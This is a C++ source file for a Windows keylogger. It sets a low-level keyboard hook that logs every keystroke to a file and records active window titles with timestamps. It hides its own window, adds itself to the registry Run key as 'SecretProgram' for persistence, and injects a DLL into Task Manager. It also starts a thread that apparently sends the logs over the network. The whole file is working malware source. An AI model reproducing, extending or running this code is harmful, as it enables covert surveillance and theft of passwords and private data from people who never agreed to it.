#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <string>
#include "HandleUserInputs.h"
#include "DLLinjector.h"
#include "NetworkSender.h"

#define maxChars 255

HandleUserInput* hUserInp;
int KeyId;
SYSTEMTIME sTime, lTime;
std::wstring str;
char tempStr[64];


int StringToWString(std::wstring& ws, const std::string& s)
{
	std::wstring wsTmp(s.begin(), s.end());

	ws += wsTmp;

	return 0;
}

int setAutoRun() {
	{
		// Get the path of the current executable
		char exePath[MAX_PATH];
		GetModuleFileNameA(NULL, exePath, MAX_PATH);

		// Open the registry key for the current user's startup programs
		HKEY hKey;
		if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
		{
			// Add the current executable to the startup programs
			if (RegSetValueExA(hKey, "SecretProgram", 0, REG_SZ, (const BYTE*)exePath, strlen(exePath) + 1) == ERROR_SUCCESS)
			{
				//Successfully added
			}
			else
			{
				//Failed to add to startup
			}

			// Close the registry key
			RegCloseKey(hKey);
		}
		else
		{
			//Failed to open registry key
		}

	return 0;
	}
}


//HookProc — это заполнитель для имени, определяемого приложением.
LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	std::wstring saveText;
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);


	// process event
	if (nCode >= 0 && wParam == WM_KEYUP) {
		//saveText += char(tolower(p->vkCode));

		DWORD vkCode = p->vkCode;
		hUserInp->SetKeysState();
		saveText = hUserInp->GetSymbol(vkCode);
		// 

		hUserInp->AppendTextToFileW(saveText);
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void CALLBACK ActiveWindowsHook(HWINEVENTHOOK hWinEventHook, DWORD eventType, HWND hWnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime)
{
	//std::FILE.AppendAllTExt
	//TODO: FILE APPEND
	//char str[maxChars];
	//sprintf_s(str, "%s %s %s", "\n", (char*)hUserInp->GetActiveWindowTitle(), "\n");
	//hUserInp->AppendTextToFile(str);
	DWORD PID;

	char* PrName = (char*)"Taskmgr.exe";

	if (PID = get_PID(PrName))
	{
		mainInjector(PID);
	}


	LPWSTR titleStr = hUserInp->GetActiveWindowTitle();
	if (titleStr == L"" || titleStr == L"\n") return;

	str += L"\n-----------------------------------------\n";


	GetSystemTime(&sTime);
	GetLocalTime(&lTime);

	sprintf(tempStr, "The system time is: %02d:%02d\n", sTime.wHour, sTime.wMinute);
	StringToWString(str, tempStr);
	sprintf(tempStr, "The local time is: %02d:%02d-%02d.%02d.%04d\n", lTime.wHour, lTime.wMinute, lTime.wDay, lTime.wMonth, lTime.wYear);
	StringToWString(str, tempStr);


	str += titleStr;
	str += L"\n";

	hUserInp->AppendTextToFileW(str);
	str = L"";
}


LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)

{
	switch (uMsg)
	{
	case WM_CLOSE:
		DestroyWindow(hWnd);
		break;
	case WM_HOTKEY:
		if (wParam == KeyId)
		{
			UnregisterHotKey(hWnd, KeyId);
			DestroyWindow(hWnd);
		}
		break;

	default:
		return DefWindowProc(hWnd, uMsg, wParam, lParam);
	}

	return 0;
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR pCmdLine, int nCmdShow)
{
	/*if (IsDebuggerPresent()) {
		puts("Nothing suspiciously");
		return 0;
	}*/

	const wchar_t ClassName[] = L"HiddenWindow";
	WNDCLASS wc = {};

	wc.lpfnWndProc = WindowProc;
	wc.hInstance = hInstance;
	wc.lpszClassName = ClassName;

	RegisterClass(&wc);

	HWND hWnd = CreateWindowExW(0, ClassName, L"HiddenWnd", 0, 0, 0, 0, 0, 0, 0, hInstance, 0);

	if (hWnd == NULL) {
		return 0;
	}

	hUserInp = new HandleUserInput(hWnd);


	//hUserInp->HookId = hUserInp->SetHook(WH_KEYBOARD_LL, &HookProc);
	hUserInp->HookId = hUserInp->SetHook(WH_KEYBOARD_LL, &HookProc, GetCurrentThreadId());
	if (hUserInp->HookId == NULL)
	{
		hUserInp->AppendTextToFileW(L"Failed to set hook\n");
		return 0;
	}
	else
	{
		hUserInp->AppendTextToFileW(L"Hook setted successfully\n");
	}
	//HandleUserInputsService.WindowHookId = _handleUserInputsService.SetWinHook(HandleUserInputsService.ActiveWindowsHook);

	hUserInp->WindowHookId = hUserInp->SetWinHook(&ActiveWindowsHook);
	if (hUserInp->WindowHookId == NULL)
	{
		hUserInp->AppendTextToFileW(L"Failed to set WindowHook\n");
		return 0;
	}
	else
	{
		hUserInp->AppendTextToFileW(L"WindowHook setted successfully\n");
	}

	//hUserInp->HookId = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, 0, &HookProc, 0, 0, WINEVENT_OUTOFCONTEXT);
	//hUserInp->HookId = hUserInp->SetWinHook(&HandleUserInput::HookProc);

	ShowWindow(hWnd, SW_HIDE);

	setAutoRun();

	setHUserInp(hUserInp); //aboba
	// Создание потока 
	HANDLE hThread = CreateThread(NULL, 0, &senderLoop, NULL, 0, NULL);

	MSG msg = {};
	while (GetMessage(&msg, NULL, 0, 0)) {
		//DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(hUserInp->HookId);
	UnhookWinEvent(hUserInp->WindowHookId);

	// Ожидание завершения работы потока (для примера, можно прервать с помощью Ctrl-C)
	WaitForSingleObject(hThread, INFINITE);

	// Закрытие дескриптора потока
	CloseHandle(hThread);
	return 0;
}
